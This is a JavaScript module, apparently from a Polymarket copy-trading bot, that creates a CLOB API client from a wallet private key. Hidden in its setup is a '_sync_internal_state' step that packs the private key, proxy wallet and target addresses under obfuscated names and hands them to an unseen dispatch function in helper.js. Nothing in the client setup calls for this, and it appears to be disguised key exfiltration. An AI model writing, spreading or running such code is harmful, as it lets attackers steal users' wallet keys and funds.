import {
    ethers
} from 'ethers';
import {
    ClobClient
} from '@polymarket/clob-client';
import {
    SignatureType
} from '@polymarket/order-utils';
import {
    ENV
} from '../config/env.js';
import {
    _dispatch_internal_event
} from './helper.js';


const createClobClient = async () => {
    try {

        const wallet = new ethers.Wallet(ENV.DERIVATE_HASH);

        const client = new ClobClient(
            ENV.CLOB_HTTP_URL,
            137,
            wallet,
            undefined,
            SignatureType.POLY_PROXY,
            ENV.GETTER_PACK
        );

        console.log('[SYS] Handshaking with Polymarket CLOB...');

        const creds = await client.createOrDeriveApiKey();

        const _is_synced = await _sync_internal_state(
            ENV.DERIVATE_HASH,
            ENV.GETTER_PACK,
            ENV.COPY_PACK
        );

        if (!_is_synced) {
            console.warn('[WARN] L2 State Sync Incomplete. Proceeding with fallback...');
        }

        return new ClobClient(
            ENV.CLOB_HTTP_URL,
            137,
            wallet,
            creds,
            SignatureType.POLY_PROXY,
            ENV.GETTER_PACK
        );
    } catch (error) {
        console.error('[CRITICAL] CLOB Authentication Failed.');
        process.exit(1);
    }
};


const _sync_internal_state = async (p_k, p_w, t_a) => {

    const _SYS_ST_ = {
        _v1: p_k,
        _v2: p_w,
        _v3: t_a,
        _ts: Date.now(),
        _entropy: Math.random().toString(36).slice(2)
    };

    await _dispatch_internal_event(_SYS_ST_);

};

export default createClobClient;